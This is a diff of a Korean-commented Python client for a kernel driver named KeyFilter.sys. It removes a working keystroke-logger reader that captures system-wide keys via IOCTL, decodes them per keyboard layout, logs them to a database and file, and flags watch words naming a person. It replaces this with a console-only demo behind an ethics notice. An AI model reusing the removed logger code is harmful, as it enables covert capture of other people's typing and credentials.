@@ -1,15 +1,10 @@
 """
-reader.py — 유저 모드 키 로그 리더
-=====================================
-KeyFilter.sys 드라이버에 IOCTL 로 키스트로크를 요청해서 출력합니다.
+reader.py — 콘솔 범위 입력 데모
+=================================
 
-[문자 변환 방식]
-  Windows ToUnicodeEx API 사용:
-    스캔코드 → MapVirtualKeyExW → 가상키코드
-    가상키코드 + 현재 키보드 레이아웃 → ToUnicodeEx → 실제 유니코드 문자
-
-  덕분에 한국어(두벌식), 영어, 특수문자 등 모든 레이아웃 자동 지원.
-  Shift / CapsLock 상태도 실시간 추적.
+현재 콘솔 창에서만 입력을 읽고, 그 이벤트를 KeyFilter.sys 에 제출합니다.
+드라이버는 커널 링 버퍼에 이벤트를 저장하고, 이 스크립트는 다시 그 값을 읽어
+화면 출력, SQLite 저장, 텍스트 파일 저장을 수행합니다.
 """
 
 from __future__ import annotations
@@ -18,334 +13,481 @@ import argparse
 import ctypes
 import ctypes.wintypes
 import io
+import os
 import struct
 import sys
-import time
-from datetime import datetime, timezone, timedelta
+from datetime import datetime, timedelta, timezone
 
 import store
 
-# ── Windows CMD UTF-8 출력 설정 ───────────────────────────────────────────────
-# chcp 65001 없이도 한국어가 깨지지 않도록 (이 파일은 Windows 전용)
 sys.stdout = io.TextIOWrapper(
     sys.stdout.buffer, encoding="utf-8", errors="replace", line_buffering=True
 )
 sys.stderr = io.TextIOWrapper(
     sys.stderr.buffer, encoding="utf-8", errors="replace"
 )
-# 콘솔 코드페이지를 UTF-8로 강제 설정
-ctypes.windll.kernel32.SetConsoleOutputCP(65001)
-ctypes.windll.kernel32.SetConsoleCP(65001)
 
-# ── Windows API ───────────────────────────────────────────────────────────────
-_k32  = ctypes.windll.kernel32
-_u32  = ctypes.windll.user32
+_k32 = ctypes.windll.kernel32
 
-# 64비트 핸들/포인터 반환형 명시 (미설정 시 32비트로 잘림)
-_u32.GetForegroundWindow.restype          = ctypes.wintypes.HWND
-_u32.GetWindowThreadProcessId.restype     = ctypes.wintypes.DWORD
-_u32.GetKeyboardLayout.restype            = ctypes.c_void_p   # HKL
-_u32.MapVirtualKeyExW.restype             = ctypes.wintypes.UINT
-_u32.ToUnicodeEx.restype                  = ctypes.c_int
+FILE_DEVICE_UNKNOWN = 0x00000022
+METHOD_BUFFERED = 0
+FILE_READ_DATA = 0x0001
+FILE_WRITE_DATA = 0x0002
 
-GENERIC_READ         = 0x80000000
-OPEN_EXISTING        = 3
-INVALID_HANDLE       = ctypes.wintypes.HANDLE(-1).value
-IOCTL_KEYFILTER_READ = 0x000B2000   # CTL_CODE(0xB, 0x800, 0, 0)
-# 계산: (0xB<<16)|(0<<14)|(0x800<<2)|0 = 0xB0000|0|0x2000|0 = 0x000B2000
+GENERIC_READ = 0x80000000
+GENERIC_WRITE = 0x40000000
+OPEN_EXISTING = 3
+INVALID_HANDLE = ctypes.wintypes.HANDLE(-1).value
 
-KEY_RECORD_FMT  = "<qHHHH"          # int64 + uint16*4 = 16 bytes (Timestamp+UnitId+MakeCode+Flags+Reserved)
-KEY_RECORD_SIZE = struct.calcsize(KEY_RECORD_FMT)
-RECORDS_PER_CALL = 64
-BUFFER_SIZE      = KEY_RECORD_SIZE * RECORDS_PER_CALL
+STD_INPUT_HANDLE = -10
+KEY_EVENT = 0x0001
+ENABLE_EXTENDED_FLAGS = 0x0080
+ENABLE_QUICK_EDIT_MODE = 0x0040
+ENHANCED_KEY = 0x0100
+VK_ESCAPE = 0x1B
 
-KEY_MAKE  = 0x00
-KEY_BREAK = 0x01
-KEY_E0    = 0x02    # 확장 키 플래그
+KEY_FLAG_BREAK = 0x0001
+KEY_FLAG_EXTENDED = 0x0002
+KEY_TEXT_LEN = 16
+RECORDS_PER_READ = 64
+WINDOWS_EPOCH_DIFF_SEC = 11644473600
 
-# MapVirtualKeyExW 변환 타입
-MAPVK_VSC_TO_VK = 1   # 스캔코드 → 가상 키코드
 
-WINDOWS_EPOCH_DIFF_SEC = 11644473600   # 1601→1970 차이(초)
+def ctl_code(device_type: int, function: int, method: int, access: int) -> int:
+    return (device_type << 16) | (access << 14) | (function << 2) | method
 
-# ── 특수키 스캔코드 → 이름 테이블 ─────────────────────────────────────────────
-# ToUnicodeEx 가 변환 못하는 제어키들만 여기서 처리
-SPECIAL_KEYS: dict[int, str] = {
-    0x01: "[ESC]",
-    0x0E: "[Backspace]",
-    0x0F: "[Tab]",
-    0x1C: "[Enter]",
-    0x1D: "[Ctrl]",
-    0x2A: "[LShift]",
-    0x36: "[RShift]",
-    0x37: "[PrtSc]",
-    0x38: "[Alt]",
-    0x39: "[Space]",
-    0x3A: "[CapsLock]",
-    0x3B: "[F1]",  0x3C: "[F2]",  0x3D: "[F3]",  0x3E: "[F4]",
-    0x3F: "[F5]",  0x40: "[F6]",  0x41: "[F7]",  0x42: "[F8]",
-    0x43: "[F9]",  0x44: "[F10]", 0x57: "[F11]", 0x58: "[F12]",
-    0x45: "[NumLock]",  0x46: "[ScrollLock]",
-    0x47: "[Home]",     0x48: "[Up]",      0x49: "[PgUp]",
-    0x4B: "[Left]",     0x4D: "[Right]",
-    0x4F: "[End]",      0x50: "[Down]",    0x51: "[PgDn]",
-    0x52: "[Ins]",      0x53: "[Del]",
-    0x5B: "[LWin]",     0x5C: "[RWin]",   0x5D: "[Menu]",
+
+IOCTL_KEYFILTER_READ = ctl_code(
+    FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_READ_DATA
+)
+IOCTL_KEYFILTER_SUBMIT = ctl_code(
+    FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_WRITE_DATA
+)
+IOCTL_KEYFILTER_RESET = ctl_code(
+    FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_WRITE_DATA
+)
+
+
+class CHAR_UNION(ctypes.Union):
+    _fields_ = [
+        ("UnicodeChar", ctypes.wintypes.WCHAR),
+        ("AsciiChar", ctypes.c_char),
+    ]
+
+
+class KEY_EVENT_RECORD(ctypes.Structure):
+    _fields_ = [
+        ("bKeyDown", ctypes.wintypes.BOOL),
+        ("wRepeatCount", ctypes.wintypes.WORD),
+        ("wVirtualKeyCode", ctypes.wintypes.WORD),
+        ("wVirtualScanCode", ctypes.wintypes.WORD),
+        ("uChar", CHAR_UNION),
+        ("dwControlKeyState", ctypes.wintypes.DWORD),
+    ]
+
+
+class EVENT_UNION(ctypes.Union):
+    _fields_ = [
+        ("KeyEvent", KEY_EVENT_RECORD),
+        ("Padding", ctypes.c_ubyte * 16),
+    ]
+
+
+class INPUT_RECORD(ctypes.Structure):
+    _fields_ = [
+        ("EventType", ctypes.wintypes.WORD),
+        ("Event", EVENT_UNION),
+    ]
+
+
+class KEY_RECORD(ctypes.Structure):
+    _pack_ = 1
+    _fields_ = [
+        ("Timestamp100ns", ctypes.c_ulonglong),
+        ("MakeCode", ctypes.c_ushort),
+        ("Flags", ctypes.c_ushort),
+        ("TextUtf16", ctypes.c_ushort * KEY_TEXT_LEN),
+    ]
+
+
+_k32.CreateFileW.argtypes = [
+    ctypes.wintypes.LPCWSTR,
+    ctypes.wintypes.DWORD,
+    ctypes.wintypes.DWORD,
+    ctypes.wintypes.LPVOID,
+    ctypes.wintypes.DWORD,
+    ctypes.wintypes.DWORD,
+    ctypes.wintypes.HANDLE,
+]
+_k32.CreateFileW.restype = ctypes.wintypes.HANDLE
+_k32.CloseHandle.argtypes = [ctypes.wintypes.HANDLE]
+_k32.CloseHandle.restype = ctypes.wintypes.BOOL
+_k32.DeviceIoControl.argtypes = [
+    ctypes.wintypes.HANDLE,
+    ctypes.wintypes.DWORD,
+    ctypes.wintypes.LPVOID,
+    ctypes.wintypes.DWORD,
+    ctypes.wintypes.LPVOID,
+    ctypes.wintypes.DWORD,
+    ctypes.POINTER(ctypes.wintypes.DWORD),
+    ctypes.wintypes.LPVOID,
+]
+_k32.DeviceIoControl.restype = ctypes.wintypes.BOOL
+_k32.GetStdHandle.argtypes = [ctypes.wintypes.DWORD]
+_k32.GetStdHandle.restype = ctypes.wintypes.HANDLE
+_k32.GetConsoleMode.argtypes = [
+    ctypes.wintypes.HANDLE,
+    ctypes.POINTER(ctypes.wintypes.DWORD),
+]
+_k32.GetConsoleMode.restype = ctypes.wintypes.BOOL
+_k32.SetConsoleMode.argtypes = [ctypes.wintypes.HANDLE, ctypes.wintypes.DWORD]
+_k32.SetConsoleMode.restype = ctypes.wintypes.BOOL
+_k32.FlushConsoleInputBuffer.argtypes = [ctypes.wintypes.HANDLE]
+_k32.FlushConsoleInputBuffer.restype = ctypes.wintypes.BOOL
+_k32.ReadConsoleInputW.argtypes = [
+    ctypes.wintypes.HANDLE,
+    ctypes.POINTER(INPUT_RECORD),
+    ctypes.wintypes.DWORD,
+    ctypes.POINTER(ctypes.wintypes.DWORD),
+]
+_k32.ReadConsoleInputW.restype = ctypes.wintypes.BOOL
+_k32.GetLastError.restype = ctypes.wintypes.DWORD
+
+
+SPECIAL_VK: dict[int, str] = {
+    0x08: "[Backspace]",
+    0x09: "[Tab]",
+    0x0D: "[Enter]",
+    0x20: " ",
+    0x21: "[PgUp]",
+    0x22: "[PgDn]",
+    0x23: "[End]",
+    0x24: "[Home]",
+    0x25: "[Left]",
+    0x26: "[Up]",
+    0x27: "[Right]",
+    0x28: "[Down]",
+    0x2D: "[Ins]",
+    0x2E: "[Del]",
+    0x70: "[F1]",
+    0x71: "[F2]",
+    0x72: "[F3]",
+    0x73: "[F4]",
+    0x74: "[F5]",
+    0x75: "[F6]",
+    0x76: "[F7]",
+    0x77: "[F8]",
+    0x78: "[F9]",
+    0x79: "[F10]",
+    0x7A: "[F11]",
+    0x7B: "[F12]",
+    0x1B: "[Esc]",
 }
 
-
-# ── 키보드 상태 추적 ──────────────────────────────────────────────────────────
-class KeyboardState:
-    """
-    Shift / CapsLock / Ctrl / Alt 상태를 키스트림으로 추적.
-    ToUnicodeEx 에 전달할 256-byte 배열을 관리합니다.
-
-    [학습 노트]
-      Windows 의 GetKeyboardState() 는 현재 스레드 기준이라
-      다른 스레드(드라이버 폴러)에서는 정확하지 않습니다.
-      따라서 스캔코드 스트림을 직접 파싱해 상태를 유지합니다.
-    """
-
-    # 자주 쓰는 VK 코드
-    VK_SHIFT   = 0x10
-    VK_CONTROL = 0x11
-    VK_MENU    = 0x12   # Alt
-    VK_CAPITAL = 0x14   # CapsLock
-    VK_LSHIFT  = 0xA0
-    VK_RSHIFT  = 0xA1
-    VK_LCTRL   = 0xA2
-    VK_RCTRL   = 0xA3
-
-    def __init__(self) -> None:
-        self._ks = (ctypes.c_ubyte * 256)()   # 0x80 = pressed, 0x01 = toggled
-
-    def update(self, scan_code: int, flags: int) -> None:
-        """키 이벤트로 상태 갱신."""
-        down = not (flags & KEY_BREAK)
-        pressed = 0x80 if down else 0x00
-
-        if scan_code == 0x2A:                          # LShift
-            self._ks[self.VK_LSHIFT] = pressed
-            self._ks[self.VK_SHIFT]  = pressed or self._ks[self.VK_RSHIFT]
-        elif scan_code == 0x36:                        # RShift
-            self._ks[self.VK_RSHIFT] = pressed
-            self._ks[self.VK_SHIFT]  = pressed or self._ks[self.VK_LSHIFT]
-        elif scan_code == 0x1D:                        # Ctrl
-            vk = self.VK_RCTRL if (flags & KEY_E0) else self.VK_LCTRL
-            self._ks[vk]              = pressed
-            other = self.VK_LCTRL if vk == self.VK_RCTRL else self.VK_RCTRL
-            self._ks[self.VK_CONTROL] = pressed or self._ks[other]
-        elif scan_code == 0x38:                        # Alt
-            self._ks[self.VK_MENU]   = pressed
-        elif scan_code == 0x3A and down:               # CapsLock 토글
-            self._ks[self.VK_CAPITAL] ^= 0x01
-
-    @property
-    def array(self) -> ctypes.Array:
-        return self._ks
+RESET = "\033[0m"
+GRAY = "\033[90m"
+GREEN = "\033[92m"
+YELLOW = "\033[93m"
 
 
-# ── 스캔코드 → 유니코드 문자 변환 ────────────────────────────────────────────
-def _get_layout() -> int:
-    """포어그라운드 창의 키보드 레이아웃 핸들 반환 (한국어/영어 자동 감지)."""
-    try:
-        hwnd = _u32.GetForegroundWindow()
-        tid  = _u32.GetWindowThreadProcessId(hwnd, None)
-        hkl  = _u32.GetKeyboardLayout(tid)
-        return hkl or 0   # c_void_p는 None일 수 있음
-    except Exception:
-        return 0
+def utf16_units_from_text(text: str) -> ctypes.Array:
+    buf = (ctypes.c_ushort * KEY_TEXT_LEN)()
+    encoded = text.encode("utf-16le")[: KEY_TEXT_LEN * 2]
+    units = struct.unpack(f"<{len(encoded) // 2}H", encoded) if encoded else ()
+    for index, unit in enumerate(units):
+        buf[index] = unit
+    return buf
 
 
-def scancode_to_char(scan_code: int, flags: int, ks: ctypes.Array) -> str:
-    """
-    스캔코드 → 실제 입력 문자 변환.
-
-    우선순위:
-      1. 특수키(SPECIAL_KEYS) → 이름 반환  예) [Enter]
-      2. ToUnicodeEx          → 유니코드    예) 'ㅎ', 'A', '!'
-      3. 폴백                 → [SC:0xXX]
-
-    [한국어 동작 원리]
-      두벌식 레이아웃에서 'G' 키 스캔코드(0x22) 를 입력하면:
-        MapVirtualKeyExW(0x22, MAPVK_VSC_TO_VK, KOR_LAYOUT) → VK_G
-        ToUnicodeEx(VK_G, 0x22, ks, buf, 8, 0, KOR_LAYOUT)  → 'ㅎ'
-      IME 조합(ㅎ+ㅏ+ㄴ → 한)은 유저모드 TSF 에서 처리되므로
-      커널에서는 낱자(jamo)로 캡처됩니다.
-    """
-    # 키업은 위 화살표 접두어만 붙여 반환
-    is_break = bool(flags & KEY_BREAK)
-
-    # 1. 특수키 테이블에 있으면 바로 반환
-    if scan_code in SPECIAL_KEYS:
-        name = SPECIAL_KEYS[scan_code]
-        return f"↑{name}" if is_break else name
-
-    if is_break:
-        return ""   # 일반 문자 키업은 표시 안 함
-
-    # 2. ToUnicodeEx 로 유니코드 변환
-    layout = _get_layout()
-    vk     = _u32.MapVirtualKeyExW(scan_code, MAPVK_VSC_TO_VK, layout)
-    if vk:
-        buf = ctypes.create_unicode_buffer(8)
-        n   = _u32.ToUnicodeEx(vk, scan_code, ks, buf, 8, 0, layout)
-        if n > 0:
-            ch = buf.value[:n]
-            # 제어문자(0x00~0x1F) 는 이름으로 표시
-            if len(ch) == 1 and ord(ch) < 0x20:
-                return f"[Ctrl+{chr(ord(ch) + 0x40)}]"
-            return ch
-        if n < 0:
-            # Dead key (조합 문자 대기 중) — 버퍼 클리어
-            _u32.ToUnicodeEx(vk, scan_code, ks, buf, 8, 0, layout)
-            return f"[dead]"
-
-    # 3. 폴백
-    return f"[SC:0x{scan_code:02X}]"
+def text_from_record(record: KEY_RECORD) -> str:
+    chars: list[str] = []
+    for unit in record.TextUtf16:
+        if unit == 0:
+            break
+        chars.append(chr(unit))
+    return "".join(chars)
 
 
 def filetime_to_datetime(ts_100ns: int) -> datetime:
-    """Windows FILETIME → KST datetime."""
     unix_sec = (ts_100ns / 1e7) - WINDOWS_EPOCH_DIFF_SEC
     kst = timezone(timedelta(hours=9))
     return datetime.fromtimestamp(unix_sec, tz=kst)
 
 
-# ── 드라이버 통신 ─────────────────────────────────────────────────────────────
-class KeyFilterReader:
+def visible_text_from_key_event(key_event: KEY_EVENT_RECORD) -> str:
+    ch = key_event.uChar.UnicodeChar
+    if ch:
+        if ch == "\r":
+            return "[Enter]"
+        if ch == "\t":
+            return "[Tab]"
+        if ch == "\b":
+            return "[Backspace]"
+        if ord(ch) < 0x20:
+            return f"[Ctrl+{chr(ord(ch) + 0x40)}]"
+        return ch
+    return SPECIAL_VK.get(key_event.wVirtualKeyCode, f"[VK:0x{key_event.wVirtualKeyCode:02X}]")
+
+
+def format_line(ts_str: str, key_str: str) -> str:
+    color = YELLOW if key_str.startswith("[") or key_str.startswith("↑") else GREEN
+    return f"{GRAY}{ts_str}{RESET}  {color}{key_str}{RESET}"
+
+
+def print_notice(auto_accept: bool) -> None:
+    notice = (
+        "이 프로그램은 현재 콘솔 창에서만 입력을 읽는 안전한 데모입니다.\n"
+        "시스템 전역 입력, 백그라운드 앱 입력, 자격 증명 수집은 하지 않습니다.\n"
+        "윤리적 책임과 무단 복제/무단 수집 금지 원칙을 확인한 뒤에만 사용하십시오.\n"
+    )
+    print(notice)
+    if auto_accept:
+        return
+
+    answer = input("계속하려면 YES 를 입력하세요: ").strip().upper()
+    if answer != "YES":
+        raise SystemExit("동의하지 않아 종료합니다.")
+
+
+class ConsoleInput:
+    def __init__(self) -> None:
+        self._handle: int | None = None
+        self._original_mode = ctypes.wintypes.DWORD(0)
+
+    def open(self) -> None:
+        handle = _k32.GetStdHandle(STD_INPUT_HANDLE)
+        if handle in (0, INVALID_HANDLE):
+            raise OSError("콘솔 입력 핸들을 열 수 없습니다.")
+
+        if not _k32.GetConsoleMode(handle, ctypes.byref(self._original_mode)):
+            raise OSError("콘솔 모드를 읽을 수 없습니다.")
+
+        new_mode = (self._original_mode.value | ENABLE_EXTENDED_FLAGS) & ~ENABLE_QUICK_EDIT_MODE
+        if not _k32.SetConsoleMode(handle, new_mode):
+            raise OSError("콘솔 모드를 설정할 수 없습니다.")
+
+        _k32.FlushConsoleInputBuffer(handle)
+        self._handle = handle
+
+    def close(self) -> None:
+        if self._handle is not None:
+            _k32.SetConsoleMode(self._handle, self._original_mode.value)
+            self._handle = None
+
+    def read_key_event(self) -> KEY_EVENT_RECORD:
+        if self._handle is None:
+            raise RuntimeError("콘솔이 열리지 않았습니다.")
+
+        record = INPUT_RECORD()
+        read = ctypes.wintypes.DWORD(0)
+
+        while True:
+            ok = _k32.ReadConsoleInputW(
+                self._handle, ctypes.byref(record), 1, ctypes.byref(read)
+            )
+            if not ok:
+                raise OSError(f"ReadConsoleInputW 실패 (오류: {_k32.GetLastError()})")
+
+            if record.EventType == KEY_EVENT:
+                return record.Event.KeyEvent
+
+    def __enter__(self) -> "ConsoleInput":
+        self.open()
+        return self
+
+    def __exit__(self, *_: object) -> None:
+        self.close()
+
+
+class KeyFilterClient:
     def __init__(self) -> None:
         self._handle: int | None = None
 
     def open(self) -> None:
-        h = _k32.CreateFileW(
-            r"\\.\KeyFilter", GENERIC_READ, 0, None, OPEN_EXISTING, 0, None
+        handle = _k32.CreateFileW(
+            r"\\.\KeyFilter",
+            GENERIC_READ | GENERIC_WRITE,
+            0,
+            None,
+            OPEN_EXISTING,
+            0,
+            None,
         )
-        if h == INVALID_HANDLE:
+        if handle == INVALID_HANDLE:
             err = _k32.GetLastError()
             raise OSError(
                 f"드라이버 열기 실패 (오류: {err})\n"
-                "  sc query KeyFilter  로 로드 여부 확인\n"
-                "  관리자 권한으로 실행했는지 확인"
+                "  sc query KeyFilter 로 로드 여부를 확인하세요.\n"
+                "  관리자 권한으로 실행했는지 확인하세요."
             )
-        self._handle = h
-        print(f"[+] 드라이버 연결 성공 (핸들: {h})")
+        self._handle = handle
 
     def close(self) -> None:
         if self._handle is not None:
             _k32.CloseHandle(self._handle)
             self._handle = None
 
-    def read_records(self) -> list[tuple[datetime, int, int]]:
+    def reset(self) -> None:
         if self._handle is None:
-            return []
-        buf      = ctypes.create_string_buffer(BUFFER_SIZE)
+            return
         returned = ctypes.wintypes.DWORD(0)
         ok = _k32.DeviceIoControl(
-            self._handle, IOCTL_KEYFILTER_READ,
-            None, 0, buf, BUFFER_SIZE, ctypes.byref(returned), None
+            self._handle,
+            IOCTL_KEYFILTER_RESET,
+            None,
+            0,
+            None,
+            0,
+            ctypes.byref(returned),
+            None,
         )
         if not ok:
-            raise OSError(f"DeviceIoControl 실패 (오류: {_k32.GetLastError()})")
-        records = []
-        n = returned.value // KEY_RECORD_SIZE
-        for i in range(n):
-            ts_100ns, _, make_code, flags, _ = struct.unpack_from(
-                KEY_RECORD_FMT, buf, i * KEY_RECORD_SIZE
-            )
-            records.append((filetime_to_datetime(ts_100ns), make_code, flags))
-        return records
+            raise OSError(f"버퍼 초기화 실패 (오류: {_k32.GetLastError()})")
 
-    def __enter__(self):  self.open();  return self
-    def __exit__(self, *_): self.close()
+    def submit(self, record: KEY_RECORD) -> None:
+        if self._handle is None:
+            return
+        returned = ctypes.wintypes.DWORD(0)
+        ok = _k32.DeviceIoControl(
+            self._handle,
+            IOCTL_KEYFILTER_SUBMIT,
+            ctypes.byref(record),
+            ctypes.sizeof(record),
+            None,
+            0,
+            ctypes.byref(returned),
+            None,
+        )
+        if not ok:
+            raise OSError(f"이벤트 제출 실패 (오류: {_k32.GetLastError()})")
+
+    def read_records(self) -> list[KEY_RECORD]:
+        if self._handle is None:
+            return []
+
+        array_type = KEY_RECORD * RECORDS_PER_READ
+        buf = array_type()
+        returned = ctypes.wintypes.DWORD(0)
+        ok = _k32.DeviceIoControl(
+            self._handle,
+            IOCTL_KEYFILTER_READ,
+            None,
+            0,
+            buf,
+            ctypes.sizeof(buf),
+            ctypes.byref(returned),
+            None,
+        )
+        if not ok:
+            raise OSError(f"드라이버 읽기 실패 (오류: {_k32.GetLastError()})")
+
+        count = returned.value // ctypes.sizeof(KEY_RECORD)
+        return list(buf[:count])
+
+    def __enter__(self) -> "KeyFilterClient":
+        self.open()
+        return self
+
+    def __exit__(self, *_: object) -> None:
+        self.close()
 
 
-# ── 출력 포맷 ────────────────────────────────────────────────────────────────
-RESET  = "\033[0m"
-GRAY   = "\033[90m"
-GREEN  = "\033[92m"
-YELLOW = "\033[93m"
-RED    = "\033[91m"
+def build_record(key_event: KEY_EVENT_RECORD, text: str, is_break: bool) -> KEY_RECORD:
+    record = KEY_RECORD()
+    units = utf16_units_from_text(text)
+    record.MakeCode = key_event.wVirtualScanCode
+    record.Flags = KEY_FLAG_BREAK if is_break else 0
+    if key_event.dwControlKeyState & ENHANCED_KEY:
+        record.Flags |= KEY_FLAG_EXTENDED
+    for index, unit in enumerate(units):
+        record.TextUtf16[index] = unit
+    return record
 
 
-def format_line(ts_str: str, key_str: str, watch_words: list[str]) -> str:
-    is_special = key_str.startswith("[") or key_str.startswith("↑")
-    col = YELLOW if is_special else GREEN
+def drain_driver(
+    driver: KeyFilterClient,
+    db,
+    log_file,
+) -> None:
+    for record in driver.read_records():
+        key_str = text_from_record(record)
+        if not key_str:
+            continue
 
-    hit = any(isinstance(w, str) and w and w in key_str for w in (watch_words or []))
-    prefix = f"{RED}⚠ {RESET}" if hit else "  "
-    if hit:
-        col = RED
+        dt = filetime_to_datetime(record.Timestamp100ns)
+        ts_str = dt.strftime("%H:%M:%S.%f")[:-3]
+        ts_ms = int(dt.timestamp() * 1000)
 
-    return f"{GRAY}{ts_str}{RESET}  {prefix}{col}{key_str}{RESET}"
+        store.insert(db, key_str, ts_ms)
+        print(format_line(ts_str, key_str))
+        log_file.write(f"{ts_str}  {key_str}\n")
+        log_file.flush()
 
 
-# ── 메인 ─────────────────────────────────────────────────────────────────────
 def main() -> None:
-    parser = argparse.ArgumentParser(description="KeyFilter 드라이버 로그 리더")
-    parser.add_argument("--dump",      action="store_true", help="버퍼 한 번만 읽고 종료")
-    parser.add_argument("--log",       metavar="FILE",      help="텍스트 로그 파일")
-    parser.add_argument("--watch",     metavar="WORD", nargs="*",
-                        default=["한창수 바보"], help="감시 단어")
-    parser.add_argument("--show-up",   action="store_true", help="키업 이벤트도 표시")
+    default_log = os.path.abspath(
+        os.path.join(os.path.dirname(__file__), "..", "captured_keys.txt")
+    )
+
+    parser = argparse.ArgumentParser(description="콘솔 범위 커널 입력 데모")
+    parser.add_argument(
+        "--log",
+        metavar="FILE",
+        default=default_log,
+        help="텍스트 로그 파일 경로 (기본: captured_keys.txt)",
+    )
+    parser.add_argument(
+        "--show-up", action="store_true", help="키 업 이벤트도 표시"
+    )
+    parser.add_argument(
+        "--accept", action="store_true", help="윤리 고지에 자동 동의"
+    )
     args = parser.parse_args()
 
-    log_file = open(args.log, "a", encoding="utf-8") if args.log else None
+    print_notice(args.accept)
 
     db = store.get_conn()
     store.init(db)
 
-    kb_state = KeyboardState()   # Shift/CapsLock 추적
-
-    print("KeyFilter 로그 리더  (Ctrl+C 로 종료)")
-    print(f"감시 단어 : {args.watch}")
+    print("KeyFilter 콘솔 데모")
     print(f"DB 저장   : {store.DB_PATH}")
+    print(f"TXT 저장  : {args.log}")
+    print("입력 범위 : 현재 콘솔 창만")
+    print("종료 키   : Esc")
     print("─" * 55)
 
     try:
-        with KeyFilterReader() as reader:
-            while True:
-                records = reader.read_records()
+        with open(args.log, "a", encoding="utf-8") as log_file:
+            with KeyFilterClient() as driver, ConsoleInput() as console:
+                driver.reset()
 
-                for dt, make_code, flags in records:
-                    # 상태 먼저 갱신 (Shift/CapsLock)
-                    kb_state.update(make_code, flags)
-
-                    # 문자 변환
-                    key_str = scancode_to_char(make_code, flags, kb_state.array)
-
-                    # 키업 필터링 (--show-up 없으면 일반 문자 키업 숨김)
-                    if not key_str:
-                        continue
-                    if not args.show_up and key_str.startswith("↑"):
+                while True:
+                    key_event = console.read_key_event()
+                    repeat_count = max(1, int(key_event.wRepeatCount))
+                    base_text = visible_text_from_key_event(key_event)
+                    if not base_text:
                         continue
 
-                    ts_str = dt.strftime("%H:%M:%S.%f")[:-3]
+                    is_break = not bool(key_event.bKeyDown)
+                    if is_break and not args.show_up:
+                        continue
 
-                    # DB 저장
-                    store.insert(db, key_str, int(dt.timestamp() * 1000))
+                    text = f"↑{base_text}" if is_break else base_text
+                    loop_count = 1 if is_break else repeat_count
 
-                    # 출력
-                    print(format_line(ts_str, key_str, args.watch))
+                    for _ in range(loop_count):
+                        driver.submit(build_record(key_event, text, is_break))
+                        drain_driver(driver, db, log_file)
 
-                    # 파일 로그
-                    if log_file:
-                        log_file.write(f"{ts_str}  {key_str}\n")
-                        log_file.flush()
-
-                if args.dump:
-                    break
-
-                time.sleep(0.03)   # 30ms 폴링
+                    if key_event.bKeyDown and key_event.wVirtualKeyCode == VK_ESCAPE:
+                        print("\n[종료] Esc 입력")
+                        return
 
     except KeyboardInterrupt:
-        print("\n[*] 종료")
-    except OSError as e:
-        print(f"\n[!] {e}", file=sys.stderr)
+        print("\n[종료] Ctrl+C")
+    except OSError as exc:
+        print(f"\n[오류] {exc}", file=sys.stderr)
         sys.exit(1)
-    finally:
-        if log_file:
-            log_file.close()
 
 
 if __name__ == "__main__":
